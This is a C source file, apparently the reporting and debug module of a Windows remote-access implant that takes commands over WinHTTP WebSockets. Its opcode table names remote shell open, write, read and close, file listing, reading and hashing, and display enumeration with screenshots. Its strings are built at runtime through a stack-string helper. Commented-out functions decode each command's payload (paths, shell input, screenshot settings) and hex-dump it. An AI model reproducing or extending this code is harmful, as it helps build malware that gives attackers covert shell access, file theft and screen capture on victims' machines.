#include "report.h"
#include "types.h"
#include "logger.h"
#include "stackstrings.h"

void ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type, PCHAR out)
{
    switch (type) {
    case WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE:
        StrNameBinMsg(out); break;
    case WINHTTP_WEB_SOCKET_BINARY_FRAGMENT_BUFFER_TYPE:
        StrNameBinFrag(out); break;
    case WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE:
        StrNameUtf8Msg(out); break;
    case WINHTTP_WEB_SOCKET_UTF8_FRAGMENT_BUFFER_TYPE:
        StrNameUtf8Frag(out); break;
    case WINHTTP_WEB_SOCKET_CLOSE_BUFFER_TYPE:
        StrNameClose(out); break;
    default:
        StrNameUnknown(out); break;
    }
}

void command_name(unsigned char opcode, PCHAR out)
{
    switch (opcode) {
    case CMD_LIST_DIRECTORY:   StrNameListDir(out); break;
    case CMD_READ_FILE:        StrNameReadFile(out); break;
    case CMD_HASH_FILE:        StrNameHashFile(out); break;
    case CMD_WRITE_SHELL:      StrNameWriteShell(out); break;
    case CMD_READ_SHELL:       StrNameReadShell(out); break;
    case CMD_GET_DISPLAYS:     StrNameGetDisplays(out); break;
    case CMD_GET_SCREENSHOT:   StrNameGetScreenshot(out); break;
    case CMD_CLOSE_SHELL:      StrNameCloseShell(out); break;
    case CMD_EXIT:             StrNameExit(out); break;
    case CMD_OPEN_SHELL:       StrNameOpenShell(out); break;
    default:                   StrNameUnknown(out); break;
    }
}

// void hex_dump(const unsigned char *data, DWORD length)
// {
//     for (DWORD row = 0; row < length; row += 16) {
//         LOG_INFO("    %04lx  ", row);
//         for (DWORD i = 0; i < 16; i++) {
//             if (row + i < length)
//                 LOG_INFO("%02x ", data[row + i]);
//             else
//                 LOG_INFO("   ");
//             if (i == 7)
//                 LOG_INFO(" ");
//         }
//         LOG_INFO(" |");
//         for (DWORD i = 0; i < 16 && row + i < length; i++) {
//             unsigned char c = data[row + i];
//             LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
//         }
//         LOG_INFO("|\n");
//     }
// }

// void describe_command_payload(unsigned char opcode,
//                               const unsigned char *p, DWORD len)
// {
//     if (len == 0) {
//         LOG_INFO("    payload: (empty)\n");
//         return;
//     }

//     switch (opcode) {
//     case CMD_LIST_DIRECTORY:
//     case CMD_HASH_FILE: {
//         LOG_INFO("    payload: path = \"");
//         for (DWORD i = 0; i + 1 < len; i += 2) {
//             unsigned char lo = p[i], hi = (i + 1 < len) ? p[i+1] : 0;
//             unsigned short wc = (unsigned short)(lo | (hi << 8));
//             if (wc == 0) break;
//             LOG_INFO("%c", (wc >= 0x20 && wc < 0x7f) ? wc : '.');
//         }
//         LOG_INFO("\"\n");
//         break;
//     }
//     case CMD_READ_FILE: {
//         if (len >= 16) {
//             unsigned long long size = 0, offset = 0;
//             for (int i = 7; i >= 0; i--)   size   = (size   << 8) | p[i];
//             for (int i = 15; i >= 8; i--) offset = (offset << 8) | p[i];
//             LOG_INFO("    payload: size = %llu, offset = %llu, path = \"",
//                    size, offset);
//             for (DWORD i = 16; i + 1 < len; i += 2) {
//                 unsigned short wc = (unsigned short)(p[i] | (p[i+1] << 8));
//                 if (wc == 0) break;
//                 LOG_INFO("%c", (wc >= 0x20 && wc < 0x7f) ? wc : '.');
//             }
//             LOG_INFO("\"\n");
//         } else {
//             LOG_INFO("    payload: (too short for ReadFile)\n");
//         }
//         break;
//     }
//     case CMD_OPEN_SHELL:
//         LOG_INFO("    payload: (empty)\n");
//         break;
//     case CMD_WRITE_SHELL: {
//         if (len >= 8) {
//             unsigned long long id = 0;
//             for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
//             LOG_INFO("    payload: shell = %llu, input = \"", id);
//             for (DWORD i = 8; i < len && p[i] != '\0'; i++) {
//                 unsigned char c = p[i];
//                 LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
//             }
//             LOG_INFO("\"\n");
//         } else {
//             LOG_INFO("    payload: (too short for WriteShell)\n");
//         }
//         break;
//     }
//     case CMD_READ_SHELL:
//     case CMD_CLOSE_SHELL: {
//         if (len >= 8) {
//             unsigned long long id = 0;
//             for (int i = 7; i >= 0; i--) id = (id << 8) | p[i];
//             LOG_INFO("    payload: shell = %llu\n", id);
//         } else {
//             LOG_INFO("    payload: (too short for %s)\n",
//                    opcode == CMD_READ_SHELL ? "ReadShell" : "CloseShell");
//         }
//         break;
//     }
//     case CMD_GET_SCREENSHOT: {
//         if (len >= 12) {
//             LOG_INFO("    payload: display = %u, quality = %u, fullscreen = %u\n",
//                    (unsigned)(p[0] | (p[1] << 8) | (p[2] << 16) |
//                               ((unsigned)p[3] << 24)),
//                    (unsigned)(p[4] | (p[5] << 8) | (p[6] << 16) |
//                               ((unsigned)p[7] << 24)),
//                    (unsigned)(p[8] | (p[9] << 8) | (p[10] << 16) |
//                               ((unsigned)p[11] << 24)));
//         } else {
//             LOG_INFO("    payload: (too short for GetScreenshot)\n");
//         }
//         break;
//     }
//     default:
//         LOG_INFO("    payload: (%lu bytes, see hex dump above)\n", len);
//         break;
//     }
// }

// void print_command(int index, const incoming_message *msg)
// {
//     // LOG_INFO("[%d] Received: type=%d (%s), len=%lu%s\n",
//     //        index, (int)msg->type, ws_buffer_type_name(msg->type, name_buf), msg->length,
//     //        msg->truncated ? " [TRUNCATED]" : "");

//     if (msg->length == 0) {
//         LOG_ERROR("    payload: (empty)\n");
//         return;
//     }

//     unsigned char opcode = msg->data[0];
//     //LOG_INFO("    command: 0x%02x - %s\n", opcode, command_name(opcode, name_buf));
//     describe_command_payload(opcode, msg->data + 1, msg->length - 1);

//     DWORD dump_len = (msg->length < HEXDUMP_LIMIT) ? msg->length
//                                                    : HEXDUMP_LIMIT;
//     hex_dump(msg->data, dump_len);
//     if (msg->length > dump_len)
//         LOG_INFO("    ... (%lu more bytes not dumped)\n", msg->length - dump_len);

//     LOG_INFO("    text: \"");
//     for (DWORD i = 0; i < msg->length; i++) {
//         unsigned char c = msg->data[i];
//         LOG_INFO("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
//     }
//     LOG_INFO("\"\n");

// }

